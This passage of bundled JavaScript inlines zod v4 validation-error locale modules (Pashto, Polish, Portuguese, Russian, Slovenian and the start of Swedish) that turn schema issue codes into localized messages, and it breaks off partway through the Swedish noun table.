}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ps.js
var error77 = () => {
  const Sizable = {
    string: { unit: "\u062A\u0648\u06A9\u064A", verb: "\u0648\u0644\u0631\u064A" },
    file: { unit: "\u0628\u0627\u06CC\u067C\u0633", verb: "\u0648\u0644\u0631\u064A" },
    array: { unit: "\u062A\u0648\u06A9\u064A", verb: "\u0648\u0644\u0631\u064A" },
    set: { unit: "\u062A\u0648\u06A9\u064A", verb: "\u0648\u0644\u0631\u064A" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0639\u062F\u062F";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u0627\u0631\u06D0";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0648\u0631\u0648\u062F\u064A",
    email: "\u0628\u0631\u06CC\u069A\u0646\u0627\u0644\u06CC\u06A9",
    url: "\u06CC\u0648 \u0622\u0631 \u0627\u0644",
    emoji: "\u0627\u06CC\u0645\u0648\u062C\u064A",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u0646\u06CC\u067C\u0647 \u0627\u0648 \u0648\u062E\u062A",
    date: "\u0646\u06D0\u067C\u0647",
    time: "\u0648\u062E\u062A",
    duration: "\u0645\u0648\u062F\u0647",
    ipv4: "\u062F IPv4 \u067E\u062A\u0647",
    ipv6: "\u062F IPv6 \u067E\u062A\u0647",
    cidrv4: "\u062F IPv4 \u0633\u0627\u062D\u0647",
    cidrv6: "\u062F IPv6 \u0633\u0627\u062D\u0647",
    base64: "base64-encoded \u0645\u062A\u0646",
    base64url: "base64url-encoded \u0645\u062A\u0646",
    json_string: "JSON \u0645\u062A\u0646",
    e164: "\u062F E.164 \u0634\u0645\u06D0\u0631\u0647",
    jwt: "JWT",
    template_literal: "\u0648\u0631\u0648\u062F\u064A"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0646\u0627\u0633\u0645 \u0648\u0631\u0648\u062F\u064A: \u0628\u0627\u06CC\u062F ${issue3.expected} \u0648\u0627\u06CC, \u0645\u06AB\u0631 ${parsedType7(issue3.input)} \u062A\u0631\u0644\u0627\u0633\u0647 \u0634\u0648`;
      case "invalid_value":
        if (issue3.values.length === 1) {
          return `\u0646\u0627\u0633\u0645 \u0648\u0631\u0648\u062F\u064A: \u0628\u0627\u06CC\u062F ${stringifyPrimitive2(issue3.values[0])} \u0648\u0627\u06CC`;
        }
        return `\u0646\u0627\u0633\u0645 \u0627\u0646\u062A\u062E\u0627\u0628: \u0628\u0627\u06CC\u062F \u06CC\u0648 \u0644\u0647 ${joinValues2(issue3.values, "|")} \u0685\u062E\u0647 \u0648\u0627\u06CC`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0689\u06CC\u0631 \u0644\u0648\u06CC: ${issue3.origin ?? "\u0627\u0631\u0632\u069A\u062A"} \u0628\u0627\u06CC\u062F ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0635\u0631\u0648\u0646\u0647"} \u0648\u0644\u0631\u064A`;
        }
        return `\u0689\u06CC\u0631 \u0644\u0648\u06CC: ${issue3.origin ?? "\u0627\u0631\u0632\u069A\u062A"} \u0628\u0627\u06CC\u062F ${adj}${issue3.maximum.toString()} \u0648\u064A`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0689\u06CC\u0631 \u06A9\u0648\u0686\u0646\u06CC: ${issue3.origin} \u0628\u0627\u06CC\u062F ${adj}${issue3.minimum.toString()} ${sizing.unit} \u0648\u0644\u0631\u064A`;
        }
        return `\u0689\u06CC\u0631 \u06A9\u0648\u0686\u0646\u06CC: ${issue3.origin} \u0628\u0627\u06CC\u062F ${adj}${issue3.minimum.toString()} \u0648\u064A`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F \u062F "${_issue.prefix}" \u0633\u0631\u0647 \u067E\u06CC\u0644 \u0634\u064A`;
        }
        if (_issue.format === "ends_with") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F \u062F "${_issue.suffix}" \u0633\u0631\u0647 \u067E\u0627\u06CC \u062A\u0647 \u0648\u0631\u0633\u064A\u0696\u064A`;
        }
        if (_issue.format === "includes") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F "${_issue.includes}" \u0648\u0644\u0631\u064A`;
        }
        if (_issue.format === "regex") {
          return `\u0646\u0627\u0633\u0645 \u0645\u062A\u0646: \u0628\u0627\u06CC\u062F \u062F ${_issue.pattern} \u0633\u0631\u0647 \u0645\u0637\u0627\u0628\u0642\u062A \u0648\u0644\u0631\u064A`;
        }
        return `${Nouns[_issue.format] ?? issue3.format} \u0646\u0627\u0633\u0645 \u062F\u06CC`;
      }
      case "not_multiple_of":
        return `\u0646\u0627\u0633\u0645 \u0639\u062F\u062F: \u0628\u0627\u06CC\u062F \u062F ${issue3.divisor} \u0645\u0636\u0631\u0628 \u0648\u064A`;
      case "unrecognized_keys":
        return `\u0646\u0627\u0633\u0645 ${issue3.keys.length > 1 ? "\u06A9\u0644\u06CC\u0689\u0648\u0646\u0647" : "\u06A9\u0644\u06CC\u0689"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u0646\u0627\u0633\u0645 \u06A9\u0644\u06CC\u0689 \u067E\u0647 ${issue3.origin} \u06A9\u06D0`;
      case "invalid_union":
        return `\u0646\u0627\u0633\u0645\u0647 \u0648\u0631\u0648\u062F\u064A`;
      case "invalid_element":
        return `\u0646\u0627\u0633\u0645 \u0639\u0646\u0635\u0631 \u067E\u0647 ${issue3.origin} \u06A9\u06D0`;
      default:
        return `\u0646\u0627\u0633\u0645\u0647 \u0648\u0631\u0648\u062F\u064A`;
    }
  };
};
function ps_default2() {
  return {
    localeError: error77()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/pl.js
var error78 = () => {
  const Sizable = {
    string: { unit: "znak\xF3w", verb: "mie\u0107" },
    file: { unit: "bajt\xF3w", verb: "mie\u0107" },
    array: { unit: "element\xF3w", verb: "mie\u0107" },
    set: { unit: "element\xF3w", verb: "mie\u0107" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "liczba";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "tablica";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "wyra\u017Cenie",
    email: "adres email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data i godzina w formacie ISO",
    date: "data w formacie ISO",
    time: "godzina w formacie ISO",
    duration: "czas trwania ISO",
    ipv4: "adres IPv4",
    ipv6: "adres IPv6",
    cidrv4: "zakres IPv4",
    cidrv6: "zakres IPv6",
    base64: "ci\u0105g znak\xF3w zakodowany w formacie base64",
    base64url: "ci\u0105g znak\xF3w zakodowany w formacie base64url",
    json_string: "ci\u0105g znak\xF3w w formacie JSON",
    e164: "liczba E.164",
    jwt: "JWT",
    template_literal: "wej\u015Bcie"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Nieprawid\u0142owe dane wej\u015Bciowe: oczekiwano ${issue3.expected}, otrzymano ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Nieprawid\u0142owe dane wej\u015Bciowe: oczekiwano ${stringifyPrimitive2(issue3.values[0])}`;
        return `Nieprawid\u0142owa opcja: oczekiwano jednej z warto\u015Bci ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Za du\u017Ca warto\u015B\u0107: oczekiwano, \u017Ce ${issue3.origin ?? "warto\u015B\u0107"} b\u0119dzie mie\u0107 ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "element\xF3w"}`;
        }
        return `Zbyt du\u017C(y/a/e): oczekiwano, \u017Ce ${issue3.origin ?? "warto\u015B\u0107"} b\u0119dzie wynosi\u0107 ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Za ma\u0142a warto\u015B\u0107: oczekiwano, \u017Ce ${issue3.origin ?? "warto\u015B\u0107"} b\u0119dzie mie\u0107 ${adj}${issue3.minimum.toString()} ${sizing.unit ?? "element\xF3w"}`;
        }
        return `Zbyt ma\u0142(y/a/e): oczekiwano, \u017Ce ${issue3.origin ?? "warto\u015B\u0107"} b\u0119dzie wynosi\u0107 ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi zaczyna\u0107 si\u0119 od "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi ko\u0144czy\u0107 si\u0119 na "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi zawiera\u0107 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Nieprawid\u0142owy ci\u0105g znak\xF3w: musi odpowiada\u0107 wzorcowi ${_issue.pattern}`;
        return `Nieprawid\u0142ow(y/a/e) ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Nieprawid\u0142owa liczba: musi by\u0107 wielokrotno\u015Bci\u0105 ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Nierozpoznane klucze${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Nieprawid\u0142owy klucz w ${issue3.origin}`;
      case "invalid_union":
        return "Nieprawid\u0142owe dane wej\u015Bciowe";
      case "invalid_element":
        return `Nieprawid\u0142owa warto\u015B\u0107 w ${issue3.origin}`;
      default:
        return `Nieprawid\u0142owe dane wej\u015Bciowe`;
    }
  };
};
function pl_default2() {
  return {
    localeError: error78()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/pt.js
var error79 = () => {
  const Sizable = {
    string: { unit: "caracteres", verb: "ter" },
    file: { unit: "bytes", verb: "ter" },
    array: { unit: "itens", verb: "ter" },
    set: { unit: "itens", verb: "ter" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "n\xFAmero";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "nulo";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "padr\xE3o",
    email: "endere\xE7o de e-mail",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "data e hora ISO",
    date: "data ISO",
    time: "hora ISO",
    duration: "dura\xE7\xE3o ISO",
    ipv4: "endere\xE7o IPv4",
    ipv6: "endere\xE7o IPv6",
    cidrv4: "faixa de IPv4",
    cidrv6: "faixa de IPv6",
    base64: "texto codificado em base64",
    base64url: "URL codificada em base64",
    json_string: "texto JSON",
    e164: "n\xFAmero E.164",
    jwt: "JWT",
    template_literal: "entrada"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Tipo inv\xE1lido: esperado ${issue3.expected}, recebido ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Entrada inv\xE1lida: esperado ${stringifyPrimitive2(issue3.values[0])}`;
        return `Op\xE7\xE3o inv\xE1lida: esperada uma das ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Muito grande: esperado que ${issue3.origin ?? "valor"} tivesse ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementos"}`;
        return `Muito grande: esperado que ${issue3.origin ?? "valor"} fosse ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Muito pequeno: esperado que ${issue3.origin} tivesse ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Muito pequeno: esperado que ${issue3.origin} fosse ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Texto inv\xE1lido: deve come\xE7ar com "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Texto inv\xE1lido: deve terminar com "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Texto inv\xE1lido: deve incluir "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Texto inv\xE1lido: deve corresponder ao padr\xE3o ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} inv\xE1lido`;
      }
      case "not_multiple_of":
        return `N\xFAmero inv\xE1lido: deve ser m\xFAltiplo de ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Chave${issue3.keys.length > 1 ? "s" : ""} desconhecida${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Chave inv\xE1lida em ${issue3.origin}`;
      case "invalid_union":
        return "Entrada inv\xE1lida";
      case "invalid_element":
        return `Valor inv\xE1lido em ${issue3.origin}`;
      default:
        return `Campo inv\xE1lido`;
    }
  };
};
function pt_default2() {
  return {
    localeError: error79()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ru.js
function getRussianPlural2(count, one, few, many) {
  const absCount = Math.abs(count);
  const lastDigit = absCount % 10;
  const lastTwoDigits = absCount % 100;
  if (lastTwoDigits >= 11 && lastTwoDigits <= 19) {
    return many;
  }
  if (lastDigit === 1) {
    return one;
  }
  if (lastDigit >= 2 && lastDigit <= 4) {
    return few;
  }
  return many;
}
var error80 = () => {
  const Sizable = {
    string: {
      unit: {
        one: "\u0441\u0438\u043C\u0432\u043E\u043B",
        few: "\u0441\u0438\u043C\u0432\u043E\u043B\u0430",
        many: "\u0441\u0438\u043C\u0432\u043E\u043B\u043E\u0432"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    },
    file: {
      unit: {
        one: "\u0431\u0430\u0439\u0442",
        few: "\u0431\u0430\u0439\u0442\u0430",
        many: "\u0431\u0430\u0439\u0442"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    },
    array: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u043E\u0432"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    },
    set: {
      unit: {
        one: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442",
        few: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u0430",
        many: "\u044D\u043B\u0435\u043C\u0435\u043D\u0442\u043E\u0432"
      },
      verb: "\u0438\u043C\u0435\u0442\u044C"
    }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0447\u0438\u0441\u043B\u043E";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u043C\u0430\u0441\u0441\u0438\u0432";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0432\u0432\u043E\u0434",
    email: "email \u0430\u0434\u0440\u0435\u0441",
    url: "URL",
    emoji: "\u044D\u043C\u043E\u0434\u0437\u0438",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u0434\u0430\u0442\u0430 \u0438 \u0432\u0440\u0435\u043C\u044F",
    date: "ISO \u0434\u0430\u0442\u0430",
    time: "ISO \u0432\u0440\u0435\u043C\u044F",
    duration: "ISO \u0434\u043B\u0438\u0442\u0435\u043B\u044C\u043D\u043E\u0441\u0442\u044C",
    ipv4: "IPv4 \u0430\u0434\u0440\u0435\u0441",
    ipv6: "IPv6 \u0430\u0434\u0440\u0435\u0441",
    cidrv4: "IPv4 \u0434\u0438\u0430\u043F\u0430\u0437\u043E\u043D",
    cidrv6: "IPv6 \u0434\u0438\u0430\u043F\u0430\u0437\u043E\u043D",
    base64: "\u0441\u0442\u0440\u043E\u043A\u0430 \u0432 \u0444\u043E\u0440\u043C\u0430\u0442\u0435 base64",
    base64url: "\u0441\u0442\u0440\u043E\u043A\u0430 \u0432 \u0444\u043E\u0440\u043C\u0430\u0442\u0435 base64url",
    json_string: "JSON \u0441\u0442\u0440\u043E\u043A\u0430",
    e164: "\u043D\u043E\u043C\u0435\u0440 E.164",
    jwt: "JWT",
    template_literal: "\u0432\u0432\u043E\u0434"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0432\u043E\u0434: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C ${issue3.expected}, \u043F\u043E\u043B\u0443\u0447\u0435\u043D\u043E ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0432\u043E\u0434: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0432\u0430\u0440\u0438\u0430\u043D\u0442: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C \u043E\u0434\u043D\u043E \u0438\u0437 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          const maxValue = Number(issue3.maximum);
          const unit = getRussianPlural2(maxValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u0431\u043E\u043B\u044C\u0448\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue3.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435"} \u0431\u0443\u0434\u0435\u0442 \u0438\u043C\u0435\u0442\u044C ${adj}${issue3.maximum.toString()} ${unit}`;
        }
        return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u0431\u043E\u043B\u044C\u0448\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue3.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435"} \u0431\u0443\u0434\u0435\u0442 ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          const minValue = Number(issue3.minimum);
          const unit = getRussianPlural2(minValue, sizing.unit.one, sizing.unit.few, sizing.unit.many);
          return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u043C\u0430\u043B\u0435\u043D\u044C\u043A\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue3.origin} \u0431\u0443\u0434\u0435\u0442 \u0438\u043C\u0435\u0442\u044C ${adj}${issue3.minimum.toString()} ${unit}`;
        }
        return `\u0421\u043B\u0438\u0448\u043A\u043E\u043C \u043C\u0430\u043B\u0435\u043D\u044C\u043A\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435: \u043E\u0436\u0438\u0434\u0430\u043B\u043E\u0441\u044C, \u0447\u0442\u043E ${issue3.origin} \u0431\u0443\u0434\u0435\u0442 ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u043D\u0430\u0447\u0438\u043D\u0430\u0442\u044C\u0441\u044F \u0441 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u0437\u0430\u043A\u0430\u043D\u0447\u0438\u0432\u0430\u0442\u044C\u0441\u044F \u043D\u0430 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u0441\u043E\u0434\u0435\u0440\u0436\u0430\u0442\u044C "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u0432\u0435\u0440\u043D\u0430\u044F \u0441\u0442\u0440\u043E\u043A\u0430: \u0434\u043E\u043B\u0436\u043D\u0430 \u0441\u043E\u043E\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u043E\u0432\u0430\u0442\u044C \u0448\u0430\u0431\u043B\u043E\u043D\u0443 ${_issue.pattern}`;
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u043E\u0435 \u0447\u0438\u0441\u043B\u043E: \u0434\u043E\u043B\u0436\u043D\u043E \u0431\u044B\u0442\u044C \u043A\u0440\u0430\u0442\u043D\u044B\u043C ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u0430\u0441\u043F\u043E\u0437\u043D\u0430\u043D\u043D${issue3.keys.length > 1 ? "\u044B\u0435" : "\u044B\u0439"} \u043A\u043B\u044E\u0447${issue3.keys.length > 1 ? "\u0438" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u043A\u043B\u044E\u0447 \u0432 ${issue3.origin}`;
      case "invalid_union":
        return "\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0435 \u0432\u0445\u043E\u0434\u043D\u044B\u0435 \u0434\u0430\u043D\u043D\u044B\u0435";
      case "invalid_element":
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u043E\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u0438\u0435 \u0432 ${issue3.origin}`;
      default:
        return `\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0435 \u0432\u0445\u043E\u0434\u043D\u044B\u0435 \u0434\u0430\u043D\u043D\u044B\u0435`;
    }
  };
};
function ru_default2() {
  return {
    localeError: error80()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/sl.js
var error81 = () => {
  const Sizable = {
    string: { unit: "znakov", verb: "imeti" },
    file: { unit: "bajtov", verb: "imeti" },
    array: { unit: "elementov", verb: "imeti" },
    set: { unit: "elementov", verb: "imeti" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0161tevilo";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "tabela";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "vnos",
    email: "e-po\u0161tni naslov",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datum in \u010Das",
    date: "ISO datum",
    time: "ISO \u010Das",
    duration: "ISO trajanje",
    ipv4: "IPv4 naslov",
    ipv6: "IPv6 naslov",
    cidrv4: "obseg IPv4",
    cidrv6: "obseg IPv6",
    base64: "base64 kodiran niz",
    base64url: "base64url kodiran niz",
    json_string: "JSON niz",
    e164: "E.164 \u0161tevilka",
    jwt: "JWT",
    template_literal: "vnos"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Neveljaven vnos: pri\u010Dakovano ${issue3.expected}, prejeto ${parsedType7(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Neveljaven vnos: pri\u010Dakovano ${stringifyPrimitive2(issue3.values[0])}`;
        return `Neveljavna mo\u017Enost: pri\u010Dakovano eno izmed ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Preveliko: pri\u010Dakovano, da bo ${issue3.origin ?? "vrednost"} imelo ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementov"}`;
        return `Preveliko: pri\u010Dakovano, da bo ${issue3.origin ?? "vrednost"} ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Premajhno: pri\u010Dakovano, da bo ${issue3.origin} imelo ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Premajhno: pri\u010Dakovano, da bo ${issue3.origin} ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Neveljaven niz: mora se za\u010Deti z "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Neveljaven niz: mora se kon\u010Dati z "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Neveljaven niz: mora vsebovati "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Neveljaven niz: mora ustrezati vzorcu ${_issue.pattern}`;
        return `Neveljaven ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Neveljavno \u0161tevilo: mora biti ve\u010Dkratnik ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Neprepoznan${issue3.keys.length > 1 ? "i klju\u010Di" : " klju\u010D"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Neveljaven klju\u010D v ${issue3.origin}`;
      case "invalid_union":
        return "Neveljaven vnos";
      case "invalid_element":
        return `Neveljavna vrednost v ${issue3.origin}`;
      default:
        return "Neveljaven vnos";
    }
  };
};
function sl_default2() {
  return {
    localeError: error81()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/sv.js
var error82 = () => {
  const Sizable = {
    string: { unit: "tecken", verb: "att ha" },
    file: { unit: "bytes", verb: "att ha" },
    array: { unit: "objekt", verb: "att inneh\xE5lla" },
    set: { unit: "objekt", verb: "att inneh\xE5lla" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType7 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "antal";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "lista";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "regulj\xE4rt uttryck",
    email: "e-postadress",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
